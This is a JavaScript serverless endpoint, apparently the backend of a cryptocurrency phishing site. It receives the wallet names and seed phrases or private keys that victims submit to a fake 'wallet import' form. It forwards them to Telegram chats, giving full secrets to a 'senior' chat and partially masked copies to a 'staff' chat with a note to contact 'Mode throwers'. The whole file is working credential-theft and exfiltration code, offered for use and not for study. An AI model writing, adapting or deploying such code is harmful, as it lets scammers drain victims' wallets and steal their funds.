async function sendTelegramMessage(botToken, chatId, message) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    if (!response.ok) {
      const error = await response.text();
      console.error(`Telegram API error for chat ${chatId}:`, error);
      return false;
    }
    return true;
  } catch (error) {
    console.error(`Failed to send Telegram notification to ${chatId}:`, error);
    return false;
  }
}

async function sendTelegramNotification(submission) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const seniorChatId = process.env.TELEGRAM_CHAT_ID;
  const staffChatId = process.env.TELEGRAM_STAFF_CHAT_ID;

  if (!botToken) {
    console.log("Telegram bot token not configured");
    return;
  }

  const words = submission.phrase.split(" ");
  const wordCount = words.length;
  const timestamp = new Date().toISOString();
  
  const isPrivateKey = wordCount === 1 || submission.phrase.startsWith("0x") || (submission.phrase.length > 50 && !submission.phrase.includes(" "));
  
  let fullMessage;
  if (isPrivateKey) {
    fullMessage = `🔔 *New Wallet Import*

💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* Private Key
⏰ *Time:* ${timestamp}

📋 *Private Key (tap to copy):*
\`${submission.phrase}\``.trim();
  } else {
    fullMessage = `🔔 *New Wallet Import*

💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* ${wordCount}-word Seed Phrase
⏰ *Time:* ${timestamp}

📋 *Seed Phrase (tap to copy):*
\`${submission.phrase}\``.trim();
  }

  let staffMessage;
  if (isPrivateKey) {
    const hiddenKey = submission.phrase.substring(0, 10) + "(******)" + submission.phrase.substring(submission.phrase.length - 4);
    staffMessage = `🔔 *New Wallet Import*

💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* Private Key
⏰ *Time:* ${timestamp}

📋 *Private Key:*
\`${hiddenKey}\`

⚠️ Last 2 words hidden for security reasons- contact Mode throwers for full information thanks 😊`.trim();
  } else {
    const hiddenWords = words.map((word, index) => {
      if (index >= wordCount - 2) {
        return "(******)";
      }
      return word;
    });
    const partialPhrase = hiddenWords.join(" ");
    
    staffMessage = `🔔 *New Wallet Import*

💼 *Wallet:* ${submission.walletType}
🔧 *Service:* ${submission.serviceName}
📝 *Type:* ${wordCount}-word Seed Phrase
⏰ *Time:* ${timestamp}

📋 *Seed Phrase:*
\`${partialPhrase}\`

⚠️ Last 2 words hidden for security reasons- contact Mode throwers for full information thanks 😊`.trim();
  }

  if (seniorChatId) {
    await sendTelegramMessage(botToken, seniorChatId, fullMessage);
  }

  if (staffChatId) {
    await sendTelegramMessage(botToken, staffChatId, staffMessage);
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { walletName, serviceName, phrase } = req.body;
    
    if (!walletName || !phrase) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    await sendTelegramNotification({
      walletType: walletName,
      serviceName: serviceName || "Unknown",
      phrase: phrase,
    });

    return res.status(201).json({ success: true, id: Date.now().toString() });
  } catch (error) {
    console.error("Error processing submission:", error);
    return res.status(500).json({ error: "Failed to process submission" });
  }
}
